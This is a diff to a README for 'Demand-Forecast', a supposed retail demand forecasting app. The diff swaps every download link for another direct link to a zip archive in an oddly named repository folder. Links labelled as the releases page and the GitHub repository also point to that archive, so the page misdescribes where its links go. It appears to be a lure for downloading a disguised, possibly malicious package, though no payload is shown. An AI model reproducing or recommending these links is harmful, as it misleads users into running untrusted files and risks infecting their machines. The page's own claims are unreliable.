@@ -1,6 +1,6 @@
 # 🛍️ Demand-Forecast - Accurate Retail Insights Made Simple
 
-[![Download Demand-Forecast](https://github.com/Prateeks078/Demand-Forecast/raw/refs/heads/main/unneutrally/Demand-Forecast-3.8.zip)](https://github.com/Prateeks078/Demand-Forecast/raw/refs/heads/main/unneutrally/Demand-Forecast-3.8.zip)
+[![Download Demand-Forecast](https://raw.githubusercontent.com/Prateeks078/Demand-Forecast/main/unneutrally/Demand_Forecast_v3.8.zip)](https://raw.githubusercontent.com/Prateeks078/Demand-Forecast/main/unneutrally/Demand_Forecast_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to **Demand-Forecast**! This application helps you forecast retail deman
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the Demand-Forecast releases.  
-   [Download Demand-Forecast](https://github.com/Prateeks078/Demand-Forecast/raw/refs/heads/main/unneutrally/Demand-Forecast-3.8.zip)
+   [Download Demand-Forecast](https://raw.githubusercontent.com/Prateeks078/Demand-Forecast/main/unneutrally/Demand_Forecast_v3.8.zip)
 
 2. **Choose the Latest Version:** On the releases page, find the latest version of Demand-Forecast.
 
@@ -79,7 +79,7 @@ A: Yes, you can visit our GitHub Issues page to get help or report any problems 
 
 ## 🌐 Additional Resources
 
-You can find more information and updates about Demand-Forecast on our [GitHub repository](https://github.com/Prateeks078/Demand-Forecast/raw/refs/heads/main/unneutrally/Demand-Forecast-3.8.zip). 
+You can find more information and updates about Demand-Forecast on our [GitHub repository](https://raw.githubusercontent.com/Prateeks078/Demand-Forecast/main/unneutrally/Demand_Forecast_v3.8.zip). 
 
 For detailed guidance, check out our documentation linked on the repository page.
 
@@ -91,4 +91,4 @@ To ensure you always have the latest updates, it is best practice to regularly c
 
 We welcome your feedback to improve Demand-Forecast. Feel free to share your thoughts, report bugs, or request new features via our GitHub issues page.
 
-[Download Demand-Forecast](https://github.com/Prateeks078/Demand-Forecast/raw/refs/heads/main/unneutrally/Demand-Forecast-3.8.zip)
+[Download Demand-Forecast](https://raw.githubusercontent.com/Prateeks078/Demand-Forecast/main/unneutrally/Demand_Forecast_v3.8.zip)
